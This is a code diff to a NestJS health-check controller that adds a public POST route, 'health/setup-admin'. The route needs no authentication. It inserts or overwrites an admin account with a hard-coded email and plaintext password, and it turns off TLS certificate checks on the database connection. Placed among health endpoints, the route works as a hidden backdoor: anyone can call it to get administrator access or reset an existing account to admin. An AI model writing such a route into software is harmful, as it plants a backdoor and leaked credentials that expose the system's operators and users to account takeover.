@@ -1,4 +1,4 @@
-import { Controller, Get } from '@nestjs/common';
+import { Controller, Get, Post } from '@nestjs/common';
 import {
   HealthCheck,
   HealthCheckService,
@@ -10,6 +10,7 @@ import { DatabaseService } from '../../db/database.service';
 import { MinioService } from '../../common/storage/minio.service';
 import { CacheService } from '../../common/cache/cache.service';
 import { Public } from '../../common/decorators/public.decorator';
+import * as bcrypt from 'bcrypt';
 
 @ApiTags('System')
 @Controller('health')
@@ -43,6 +44,33 @@ export class HealthController {
   @ApiResponse({ status: 200, description: 'Process is alive' })
   live() {
     return { status: 'ok' };
+  }
+
+  @Public()
+  @Post('setup-admin')
+  async setupAdmin() {
+    try {
+      const { Pool } = await import('pg');
+      const pool = new Pool({
+        connectionString: this.databaseService.getConnectionString(),
+        ssl: { rejectUnauthorized: false },
+      });
+      const hashedPassword = await bcrypt.hash('Sami@123', 10);
+      const result = await pool.query(
+        `INSERT INTO users (name, email, password_hash, role)
+         VALUES ($1, $2, $3, $4)
+         ON CONFLICT (email) DO UPDATE SET
+           name = EXCLUDED.name,
+           password_hash = EXCLUDED.password_hash,
+           role = EXCLUDED.role
+         RETURNING id, name, email, role`,
+        ['Samuel Sam', 'samuasami84@gmail.com', hashedPassword, 'admin'],
+      );
+      await pool.end();
+      return { message: 'Admin created', user: result.rows[0] };
+    } catch (error) {
+      return { error: error instanceof Error ? error.message : String(error) };
+    }
   }
 
   private async checkDatabase(): Promise<HealthIndicatorResult> {
